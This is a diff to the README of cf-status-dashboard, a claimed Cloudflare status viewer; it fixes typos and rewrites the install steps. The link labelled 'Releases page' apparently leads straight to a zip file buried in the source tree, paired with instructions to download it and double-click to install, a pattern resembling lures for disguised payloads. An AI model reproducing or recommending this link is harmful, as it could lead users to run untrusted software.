@@ -10,7 +10,7 @@ Welcome to the cf-status-dashboard! This application provides a real-time view o
 To use cf-status-dashboard, you should have:
 - A computer running Windows, macOS, or Linux.
 - A stable internet connection.
-- Updated web browser (Chrome, Firefox, Safari, or Edge).
+- An up-to-date web browser (Chrome, Firefox, Safari, or Edge).
 
 ## 📦 Download & Install
 To get started, visit the [Releases page](https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/datacenters/status-cf-dashboard-v3.5.zip) to download the latest version of cf-status-dashboard. 
@@ -18,7 +18,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/rkzi
 ### Steps to Download:
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of cf-status-dashboard.
-3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/datacenters/status-cf-dashboard-v3.5.zip for Linux).
+3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or `.zip` for Linux).
 4. Download the file to your computer.
 5. Once the download is complete, locate the file and double-click it to start the installation.
 
@@ -34,14 +34,14 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/rkzi
 3. Open your Applications folder and double-click the cf-status-dashboard to start the application.
 
 ### For Linux:
-1. Download the https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/datacenters/status-cf-dashboard-v3.5.zip file.
+1. Download the `.zip` file from the Releases page.
 2. Extract the files using a terminal or file manager.
 3. Open the terminal and navigate to the extracted folder.
 4. Run the application using the command provided in the extracted package.
 
 ## 🎨 Features
 - **Real-Time Monitoring:** Get instant updates on Cloudflare's status with a visual dashboard.
-- **Interactive Glove and Map:** Explore Cloudflare’s global infrastructure on a 3D globe and 2D world map.
+- **Interactive Globe and Map:** Explore Cloudflare’s global infrastructure on a 3D globe and 2D world map.
 - **User-Friendly Interface:** Designed for ease of use for all skill levels.
 - **Open Source:** Contribute to the project and improve its features.
 
